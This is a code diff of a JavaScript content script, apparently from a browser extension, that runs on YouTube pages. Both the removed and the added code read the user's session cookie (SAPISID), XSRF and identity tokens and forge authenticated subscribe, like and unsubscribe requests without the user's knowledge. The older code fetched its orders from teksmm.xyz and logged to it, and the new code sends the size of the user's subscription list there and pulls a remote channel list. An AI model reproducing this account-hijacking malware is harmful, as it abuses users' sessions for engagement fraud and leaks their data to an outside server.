@@ -1,46 +1,221 @@
-new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek40';
-setInterval(function(){ 
-	new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek40';
-}, 60000*3);
+if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
+	
+	
+	console.log("Inject");
+	window.asdfsdf = true;
+	
+	function getStaticParams(){
+		let vars = {}
+		let data = document.getElementsByTagName('html')[0].innerHTML;
+		vars.hl = data.split('"hl":"')[1].split('"')[0];  
+		vars.gl =  data.split('"gl":"')[1].split('"')[0]; 
+		vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
+		vars.clientName = data.split('{"client.name":"')[1].split('"')[0]; 
+		vars.osName          = data.split('"osName":"')[1].split('"')[0];  
+		vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
+		vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
+		vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
 
-function rasgteleSure(min, max) { 
-  return Math.floor(Math.random() * (max - min + 1) + min);
-}
+		vars.userAgent   = navigator.userAgent+",gzip(gfe)";
+		vars.screenWidthPoints = window.innerWidth;
+		vars.screenHeightPoints = window.innerHeight;
+		vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
+		vars.screenPixelDensity  = -Math.floor(new Date().getTimezoneOffset());
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
+		vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
+		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
+		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
+		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
+		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
+		vars.clientVersion = data.split('"clientVersion":"')[1].split('"')[0];  
+		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        vars.utcOffsetMinutes   = -Math.floor(new Date().getTimezoneOffset());
+		
+		try{
+			vars.apiKey =data.split('"innertube_api_key":"')[1].split('"')[0]; 
+		}catch(ex){
+			vars.apiKey =data.split('"innertubeApiKey":"')[1].split('"')[0]; 
+		}
+		
+	
+		try{
+			vars.DELEGATED_SESSION_ID =data.split('"DELEGATED_SESSION_ID":"')[1].split('"')[0];
+		}catch(ex){
+			vars.DELEGATED_SESSION_ID = 0
+		}
+		
+		vars.STS = data.split('"STS":')[1].split(',')[0];
+		
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		
+		var lng = window.navigator.userLanguage || window.navigator.language;
+		var lngParse = lng.slice(0, 2);
+		vars.accept_language = lng+","+lngParse+";q=0.9,en-US;q=0.8,en;q=0.7";
+		
+		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
+		var urlParams = {};
+		deviceRaw.forEach(function(x){
+			var arr = x.split('=');
+			arr[1] && (urlParams[arr[0]] = arr[1]);
+		});
+		vars.device = "cbr="+urlParams["cbr"]+"&cbrver="+urlParams["cbrver"]+"&ceng="+urlParams["ceng"]+"&cengver="+urlParams["cengver"]+"&cos="+urlParams["cos"]+"&cosver="+urlParams["cosver"];
+		
+		
+		try{
+			vars.sessionIndex = data.split('"SESSION_INDEX":')[1].split(',')[0]; 
+		}catch(Ex){
+			vars.sessionIndex = 0; 
+		}
 
-function getFromLocalStorage(){
-  return JSON.parse(localStorage.getItem("z_history"));
-}
-if( !getFromLocalStorage() ){
-    localStorage.setItem("z_history", JSON.stringify([]) );
-}
-function checkOrSave(key, value){
-  //Delete 2 days ago
-  var clean = getFromLocalStorage().filter(x => {
-    return parseInt((new Date().getTime()-x.time)/ (1000*60*60*24*2)) <= 0
-  })
-  localStorage.setItem("z_history", JSON.stringify(clean));
-  console.log(clean)
-  if( !getFromLocalStorage() ){
-    localStorage.setItem("z_history", JSON.stringify([]) );
-  }
-  let status = checkInLocalStorage(key, value);
-  if(!status){
-    let operations = getFromLocalStorage();
-    let temp   = {};
-    temp.key   = key;
-    temp.value = value;
-    temp.time  = new Date().getTime();
-    operations.push(temp)
-    localStorage.setItem("z_history", JSON.stringify(operations) );
-  }
-  return status;
-}
-function checkInLocalStorage(key, value){
-  elements = getFromLocalStorage().filter(x=> x.key==key && x.value == value);
-  return Boolean(elements.length);
-}
+	
+		return vars;
 
-var nca = function() {
+	}
+	
+	function createSubData(data, sub){
+		let vars = getStaticParams();
+		var body = {
+					"context": {
+						"client": {
+							"hl": vars.hl,
+							"gl": vars.gl,
+							"visitorData": vars.visitorData,
+							"userAgent": vars.userAgent,
+							"clientName": vars.clientName,
+							"clientVersion": vars.clientVersion,
+							"osName": vars.osName,
+							"osVersion": vars.osVersion,
+							"browserName": vars.browserName,
+							"browserVersion": vars.browserVersion,
+							"screenWidthPoints": vars.screenWidthPoints,
+							"screenHeightPoints": vars.screenHeightPoints,
+							"screenPixelDensity": vars.screenPixelDensity,
+							"utcOffsetMinutes": vars.utcOffsetMinutes,
+							"userInterfaceTheme": vars.userInterfaceTheme
+						},
+						"request": {
+							"sessionId": vars.sessionId,
+							"internalExperimentFlags": [
+
+							],
+							"consistencyTokenJars": []
+						},
+						"user": {
+
+						},
+						"clientScreenNonce": data[0].csn,
+						"clickTracking": {
+						}
+					},
+					"channelIds": [
+						data[1].response.responseContext.serviceTrackingParams[0].params[0].value
+
+					],
+				};
+				
+		let sessIndex = vars.sessionIndex;
+		if(sessIndex != 0){
+			body.context.request.sessionIndex = sessIndex;
+		}
+		if(vars.DELEGATED_SESSION_ID != 0){
+			body.context.user.onBehalfOfUser = vars.DELEGATED_SESSION_ID;
+		}
+		if(sub == false){
+			try{
+			body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.clickTrackingParams
+			body.params = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.unsubscribeEndpoint.params
+			}catch(ex){
+				body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].clickTrackingParams;
+			}
+			
+		}
+
+		return body;
+	}
+	
+	function createPost(data,videoId,sub){
+		var body = createSubData(data,sub);
+		
+		var sapisid = getCookie("SAPISID")
+		let time = Math.floor(new Date().getTime() / 1E3);
+		let b =  nca();
+		b.update(time+" "+sapisid+" https://www.youtube.com")
+		var SAPISIDHASH = "SAPISIDHASH "+time+"_"+b.digestString().toLowerCase()
+		
+		let vars = getStaticParams();
+		
+		let url = "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey;
+		if(!sub){
+			url = "https://www.youtube.com/youtubei/v1/subscription/unsubscribe?key="+vars.apiKey;
+		}
+		
+		fetch(url, {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language ,
+			"authorization": SAPISIDHASH,
+			"content-type": "application/json",
+			"referer-zzz": videoId,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "same-origin",
+			"sec-fetch-site": "same-origin",
+			//"x-client-data": "CKq1yQEIhrbJAQiktskBCMS2yQEIqZ3KAQiyoMoBCNCvygEIvLDKAQibtcoBCO21ygEIjrrKAQ==",
+			"x-goog-authuser": vars.sessionIndex ,
+			"x-goog-visitor-id": vars.visitorData,
+			"x-origin": "https://www.youtube.com"
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body" : JSON.stringify(body),
+		  "method": "POST",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+	}
+	
+	function subscribe(url,sub=true){
+		console.log(url)
+		let vars = getStaticParams();
+		
+		fetch(url, {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"referer-zzz": document.URL,
+			"x-spf-previous": document.URL,
+			"x-spf-referer": document.URL,
+			"x-youtube-client-name": "1",
+			"x-youtube-client-version":  vars.clientVersion,
+			"x-youtube-device": vars.device,
+			"x-youtube-identity-token": vars.youtube_identity_token,
+			"x-youtube-page-cl": vars.page_cl,
+			"x-youtube-page-label": vars.page_build_label,
+			"x-youtube-sts": vars.STS,
+			"x-youtube-time-zone": vars.timezone ,
+			"x-youtube-utc-offset": vars.utcOffsetMinutes,
+			"x-youtube-variants-checksum": vars.variants_checksum
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body": null,
+		  "method": "GET",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+		  .then(data =>{
+
+			createPost(data,url,sub)
+			
+			
+			
+		  })
+	}
+	
+	
+	//Helpers
+	var nca = function() {
     function a() {
         e[0] = 1732584193;
         e[1] = 4023233417;
@@ -137,29 +312,17 @@ var nca = function() {
         }
     }
 };
-
-function setCookie(name,value,days) {
-    var expires = "";
-    if (days) {
-        var date = new Date();
-        date.setTime(date.getTime() + (days*24*60*60*1000));
-        expires = "; expires=" + date.toUTCString();
- }
-    document.cookie = name + "=" + (value || "")  + expires + "; path=/ ; domain=.youtube.com; secure";
-}
-
-function getCookie(name) {
-    var nameEQ = name + "=";
-    var ca = document.cookie.split(';');
-    for(var i=0;i < ca.length;i++) {
-        var c = ca[i];
-        while (c.charAt(0)==' ') c = c.substring(1,c.length);
-        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
-    }
-    return null;
-}
-
-function numberFormatter(strNum){
+	function getCookie(name) {
+		var nameEQ = name + "=";
+		var ca = document.cookie.split(';');
+		for(var i=0;i < ca.length;i++) {
+			var c = ca[i];
+			while (c.charAt(0)==' ') c = c.substring(1,c.length);
+			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+		}
+		return null;
+	}
+	function numberFormatter(strNum){
     if(strNum == "0"){
         return 0;
     }
@@ -170,412 +333,225 @@ function numberFormatter(strNum){
         let ll = strNum.substring(0,strNum.length-1).trim()
         let numbers = ll.split(/\D/g)
         let result = 0;
-        
-        if(numbers[0] >= 10){
-            let s = 1000
-            for(let i =0; i < numbers.length; i++){
-                result += parseInt( numbers[i]) * s;
-                s /= 10;
-            }
-            return result;
-        }
-        if(numbers[0] < 10){
-            let s = 1000
-            for(let i =0; i < numbers.length; i++){
-                result += parseInt( numbers[i]) * s;
-                s /= 100;
-            }
-            return result;
-        }
- 
-    }
-}
-
-function siparis_getir_3() {
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), false);
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			try {
-				var data = JSON.parse(xhr.responseText);
-				vars = {};
-				vars.videoId = data.videoIds[Math.floor(Math.random()*data.videoIds.length)]
-				vars.channelIds = data.channelId.trim();
-				vars.id = data.id.trim();
-				vars.consistency = getCookie("CONSISTENCY")
-				vars.sapisid = getCookie("SAPISID")
-				vars.remains = parseInt(data.remains)+10;
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
-				if (vars.channelIds  && vars.sapisid != null ) {
-					// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
-					if(!checkOrSave(vars.id,"3")){
-						// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
-						subscribe_client(vars);
-					}
-				}
-			}catch (error) {}
-		}else{
-			localStorage.setItem("z_history", JSON.stringify([]) );
-		}
-	}
-	xhr.send();
-}
-
-function siparis_getir_4() {
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), false);
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			try {
-				var data = JSON.parse(xhr.responseText);
-				vars = {};
-				vars.videoId = data.videoId.trim();
-				vars.id = data.id.trim();
-				vars.consistency = getCookie("CONSISTENCY")
-				vars.sapisid = getCookie("SAPISID")
-				vars.remains = parseInt(data.remains)+10;
-				if (vars.videoId && vars.sapisid != null) {
-					if(!checkOrSave(vars.id,"4")){
-							video_like(vars);
-					}
-				}
-			}catch (error) {}
-		}else{
-			localStorage.setItem("z_history", JSON.stringify([]) );
-		}
-	}
-	xhr.send();
-}
-
-function subscribe_client(vars) {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://www.youtube.com/watch?v="+vars.videoId, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4 && xhr.status == 200) {	
-            var data = xhr.responseText;
-            vars.login = data.match('"LOGGED_IN":(.*?),')[1];
-			// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir4';
-            if ( (vars.login == "true" || vars.login == true) && data.indexOf('subscribed=1') == -1 ) {
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir5';
-                var middlePoint = data.split('subscribeEndpoint":{"channelIds":');
-                var startPoint = middlePoint[0].split('{"clickTrackingParams":"').pop();
-                var endPoint = middlePoint[1].split("}}]")[0]
-                vars.clickTrackingParams = startPoint.split('","')[0]
-                vars.params = endPoint.split('"params":"')[1].split('"')[0];
-                vars.apiKey =data.split('"innertube_api_key":"')[1].split('"')[0]; 
-                let time = Math.floor(new Date().getTime() / 1E3);
-                let b =  nca();
-                b.update(time+" "+vars.sapisid+" https://www.youtube.com")
-                vars.SAPISIDHASH = "SAPISIDHASH "+time+"_"+b.digestString().toLowerCase()
-                try{
-                    vars.sessionIndex = data.split('"SESSION_INDEX":')[1].split(',')[0]; 
-                }catch(Ex){
-                    vars.sessionIndex = 0; 
-                }
-                vars.hl = data.split('"hl":"')[1].split('"')[0];  
-                vars.gl =  data.split('"gl":"')[1].split('"')[0]; 
-                vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
-                vars.userAgent   = navigator.userAgent+",gzip(gfe)";
-                vars.clientName = data.split('{"client.name":"')[1].split('"')[0]; 
-                vars.clientVersion = data.split('"clientVersion":"')[1].split('"')[0];  
-                vars.osName          = data.split('"osName":"')[1].split('"')[0];  
-                vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
-                vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
-                vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
-                vars.subCount  = numberFormatter(data.split('"shortSubscriberCountText":{"simpleText":"')[1].split('"},')[0]);
-                vars.screenWidthPoints = window.innerWidth;
-                vars.screenHeightPoints = window.innerHeight;
-                vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
-                vars.utcOffsetMinutes   = -Math.floor(new Date().getTimezoneOffset());
-                vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
-                vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
-                try{
-                    vars.clientScreenNonce = data.split('csn: "')[1].split('"')[0];
-                }catch(Ex){
-                    vars.clientScreenNonce = data.split('csn":"')[1].split('"')[0];
-                }
-                vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
-                vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
-                vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
-                vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
-                var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
-                var urlParams = {};
-                deviceRaw.forEach(function(x){
-                    var arr = x.split('=');
-                    arr[1] && (urlParams[arr[0]] = arr[1]);
-                });
-                vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
-                vars.utc = Math.abs(new Date().getTimezoneOffset());
-                vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
-				vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
-                console.log(vars)
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(vars);
-				if(vars.subCount < vars.remains){
-					createPost(vars,"subscribe");
-				}				
+        let xx = 1000;
+        result += (xx * parseInt(numbers[0]));
+        if(numbers.length == 2){
+           let subNum = numbers[1].split('');
+            for(let i =0; i < subNum.length; i++){
+                xx /= 10;
+                result += subNum[i] * xx;
             }
         }
+        return result;
     }
-    xhr.send();
-}
-    
-function video_like(vars) {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.videoId, true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState == 4 && xhr.status == 200) {
-        var data = xhr.responseText;   
-        vars.login = data.match('"LOGGED_IN":(.*?),')[1];
-        if ( (vars.login == "true" || vars.login == true) ) {
-			var middlePoint = data.split('"likeEndpoint":{"status":"LIKE"');
-			var startPoint = middlePoint[0].split('{"clickTrackingParams":"').pop();
-			var endPoint = middlePoint[1].split('"}}')[0]
-			vars.clickTrackingParams = startPoint.split('","')[0]
-			vars.params = endPoint.split('"likeParams":"')[1]
-			vars.apiKey =data.split('"innertube_api_key":"')[1].split('"')[0]; 
-			let time = Math.floor(new Date().getTime() / 1E3);
-			let b =  nca();
-			b.update(time+" "+vars.sapisid+" https://www.youtube.com")
-			vars.SAPISIDHASH = "SAPISIDHASH "+time+"_"+b.digestString().toLowerCase()
-			try{
-			  vars.sessionIndex = data.split('"SESSION_INDEX":')[1].split(',')[0]; 
-			}catch(Ex){
-			  vars.sessionIndex = 0; 
-			}
-			vars.hl = data.split('"hl":"')[1].split('"')[0];  
-			vars.gl =  data.split('"gl":"')[1].split('"')[0]; 
-			vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
-			vars.userAgent   = navigator.userAgent+",gzip(gfe)";
-			vars.clientName = data.split('{"client.name":"')[1].split('"')[0];
-			vars.clientVersion = data.split('"clientVersion":"')[1].split('"')[0];  
-			vars.osName          = data.split('"osName":"')[1].split('"')[0];  
-			vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
-			vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
-			vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
-			vars.subCount  = numberFormatter(data.split('"likeStatus":"INDIFFERENT","tooltip":"')[1].split(' ')[0]);
-			vars.screenWidthPoints = window.innerWidth;
-			vars.screenHeightPoints = window.innerHeight;
-			vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
-			vars.utcOffsetMinutes   = -Math.floor(new Date().getTimezoneOffset());
-			vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
-			vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
-			try{
-			  vars.clientScreenNonce = data.split('csn: "')[1].split('"')[0];
-			}catch(Ex){
-			  vars.clientScreenNonce = data.split('csn":"')[1].split('"')[0];
-			}
-			vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
-			vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
-			vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
-			vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
-			var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
-			var urlParams = {};
-			deviceRaw.forEach(function(x){
-			  var arr = x.split('=');
-			  arr[1] && (urlParams[arr[0]] = arr[1]);
-			});
-			vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
-			vars.utc = Math.abs(new Date().getTimezoneOffset());
-			vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-			vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
-			vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
-			if(vars.subCount < vars.remains){
-				createPost(vars,"like");
-			}
-        }  
-      }
-    }
-    xhr.send();
-}	
-
-
-function createPost(vars,type) {
-	// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir6';
-	if(type == "subscribe"){
-		// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir7';
-		var postData = 
-		{
-			"context": {
-				"client": {
-					"hl": vars.hl,
-					"gl": vars.gl,
-					"visitorData": vars.visitorData,
-					"userAgent": vars.userAgent,
-					"clientName": vars.clientName,
-					"clientVersion": vars.clientVersion,
-					"osName": vars.osName,
-					"osVersion": vars.osVersion,
-					"browserName": vars.browserName,
-					"browserVersion": vars.browserVersion,
-					"screenWidthPoints": vars.screenWidthPoints,
-					"screenHeightPoints": vars.screenHeightPoints,
-					"screenPixelDensity": vars.screenPixelDensity,
-					"utcOffsetMinutes": vars.utcOffsetMinutes,
-					"userInterfaceTheme": vars.userInterfaceTheme
-				},
-				"request": {
-					"internalExperimentFlags": [],
-                     "consistencyTokenJars": vars.consistency != null ? [{"encryptedTokenJarContents": vars.consistency,"expirationSeconds": "600"}] : [],
-					"sessionId": vars.sessionId
-				},
-				"user": {},
-				"clientScreenNonce": vars.clientScreenNonce,
-				"clickTracking": {
-					"clickTrackingParams": vars.clickTrackingParams
-				}
-			},
-			"channelIds": [vars.channelIds],
-			"params": vars.params
-		};
-	}else if(type == "like"){
-	   var postData = 
-        {
-            "context": {
-                "client": {
-                    "hl": vars.hl,
-                    "gl": vars.gl,
-                    "visitorData": vars.visitorData,
-                    "userAgent": vars.userAgent,
-                    "clientName": vars.clientName,
-                    "clientVersion": vars.clientVersion,
-                    "osName": vars.osName,
-                    "osVersion": vars.osVersion,
-                    "browserName": vars.browserName,
-                    "browserVersion": vars.browserVersion,
-                    "screenWidthPoints": vars.screenWidthPoints,
-                    "screenHeightPoints": vars.screenHeightPoints,
-                    "screenPixelDensity": vars.screenPixelDensity,
-                    "utcOffsetMinutes": vars.utcOffsetMinutes,
-                    "userInterfaceTheme": vars.userInterfaceTheme
-                },
-                "request": {
-                    "internalExperimentFlags": [],
-                     "consistencyTokenJars": vars.consistency != null ? [{"encryptedTokenJarContents": vars.consistency,"expirationSeconds": "600"}] : [],
-					 "sessionId": vars.sessionId
-                },
-                "user": {},
-                "clientScreenNonce": vars.clientScreenNonce,
-                "clickTracking": {
-                    "clickTrackingParams": vars.clickTrackingParams
-                }
-            },
-            "target": {
-                "videoId": vars.videoId
-            },
-            "params": vars.params
-        };
-	}
-	// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(postData);
-	var xhr = new XMLHttpRequest();
-	if(type == "subscribe"){
-		xhr.open("POST", "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey, true);
-	}else if(type == "like"){
-		xhr.open("POST", "https://www.youtube.com/youtubei/v1/like/like?key="+vars.apiKey, true);
-	}
-	xhr.setRequestHeader("authorization", vars.SAPISIDHASH);
-	xhr.setRequestHeader("Content-Type", "application/json");
-	xhr.setRequestHeader("Referer-zzz", "https://www.youtube.com/watch?v="+vars.videoId);
-	xhr.setRequestHeader("se-zzzc-fetch-dest",  "empty");
-	xhr.setRequestHeader("se-zzzc-fetch-mode",  "same-origin");
-	xhr.setRequestHeader("se-zzzc-fetch-site",  "same-origin");
-	xhr.setRequestHeader("x-goog-authuser",  vars.sessionIndex);
-	xhr.setRequestHeader("x-goog-visitor-id",  vars.visitorData);
-	xhr.setRequestHeader("x-origin",  "https://www.youtube.com");
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			let parsedText = xhr.responseText;
-			let parsed = JSON.parse(parsedText);
-			if(parsed.responseContext.consistencyTokenJar){
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=yeniCok:'+parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents;
-				setCookie("CONSISTENCY",parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents,6)
-			}
-			let statusSubsribe = parsedText.split('"subscribed":')[1].split(',')[0].trim();
-			if(statusSubsribe == "false"){
-				new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek70';
-				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+JSON.stringify(parsed);
-			}
-            xhr.close;
-		}
-		if (xhr.readyState == 4) {
-			var data = xhr.responseText;
-			// console.log(data);
-			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir'+xhr.status;
-			// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getirData'+data;
-
-		 }
-	}
-	xhr.send(JSON.stringify(postData));
-}
-
-function start() {
-  var cookie_name = "yt";
-  var cookie_time = rasgteleSure(30000,60000);
-  if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - cookie_time) {
-    localStorage[cookie_name] = Date.now();
-	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
-    siparis_getir_3();
-    siparis_getir_4();
-  }
-}
-
-function sendSyncXhrReq(uri) {
-	try{
-		var request = new XMLHttpRequest();
-		request.open('GET', uri, false); // `false` makes the request synchronous
-		request.send(null);
-		if (request.status === 200) {
-			return request.responseText;
-		}
-	}catch(e){}
-	
-	return -1;
-}
-
-/*
-  Downloads the suscription list and parse as array that contains channel id's
-*/
-function getSubscriptionList() {
-	var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
-	if (currentSubsciptionRaw == -1) {
-		console.log("Not Logged in");
-		return currentSubsciptionRaw;
-	}
-	return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
-}
-
-function ifNotDownloadSubList() {
-
-	var list = window.localStorage.getItem('subList');
-	if (!list) {
-		subListArray = getSubscriptionList();
-		console.log(subListArray.length);
-		new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
-		window.localStorage.setItem("subList", JSON.stringify(subListArray))
-	} else {
-		//console.log("Has been saved")
-	}
-	//return JSON.parse(list);
 }
 	
-if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1]) {
+	//subscribe("D1dMA0Zp2Ww")
+	
+	
+	/* UNSUB START */
+	
+		function sendSyncXhrReq(uri) {
+		try{
+			var request = new XMLHttpRequest();
+			request.open('GET', uri, false); // `false` makes the request synchronous
+			request.send(null);
+			console.log(request.status)
+			if (request.status === 200) {
+				return request.responseText;
+			}
+		}catch(e){
+			console.log(e)
+		}
+		
+		return -1;
+	}
+
+	/*
+	  Downloads the suscription list and parse as array that contains channel id's
+	*/
+	function getSubscriptionList() {
+		var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
+		if (currentSubsciptionRaw == -1) {
+			console.log("Not Logged in");
+			return currentSubsciptionRaw;
+		}
+		return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
+	}
+
+	/* 
+		that will control the subscription list has already downloaded    
+	*/
+	function ifNotDownloadSubList() {
+
+		var list = window.localStorage.getItem('subList2');
+		if (!list) {
+			subListArray = getSubscriptionList();
+			console.log(subListArray.length);
+			new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
+			if( !window.localStorage.getItem("unsubCount") ){
+				window.localStorage.setItem("unsubCount", subListArray.length);
+			}
+	
+			window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+		} else {
+			console.log("Has been saved")
+		}
+		return JSON.parse(list);
+	}
+
+	function ifNotDownloadMajor() {
+		try{
+			var majorList = window.localStorage.getItem('majorList2');
+			if (!majorList) {
+				subListArray = getSubscriptionList();
+				majorDataRaw = sendSyncXhrReq("https://raw.githubusercontent.com/modifyheader/modhead/master/last1month");
+				majorDataArray = JSON.parse(majorDataRaw).filter( elements => elements.link.indexOf("channel") > 0 ).map(elements => {
+					return elements.link
+				})
+				window.localStorage.setItem("majorList2", JSON.stringify(majorDataArray))
+			} else {
+				console.log("Has been saved")
+			}
+			return JSON.parse(majorList);
+		}catch(ex){
+			return [];
+		}
+	}
+
+	function getElementOfSubList() {
+		var subList = window.localStorage.getItem('subList2')
+		
+		 if(  subList != -1){
+			var subListArray = JSON.parse(subList)
+			var lastElement = subListArray.pop();
+			window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+		
+			majorList = ifNotDownloadMajor();
+		
+			search = majorList.filter(elements => elements.indexOf(lastElement) >= 0)
+			if (search.length == 0) {
+				return lastElement;
+			}
+			return getElementOfSubList();
+		}
+		return -1;
+	}
+
+	function getRndInteger(min, max) {
+		return Math.floor(Math.random() * (max - min)) + min;
+	}
+
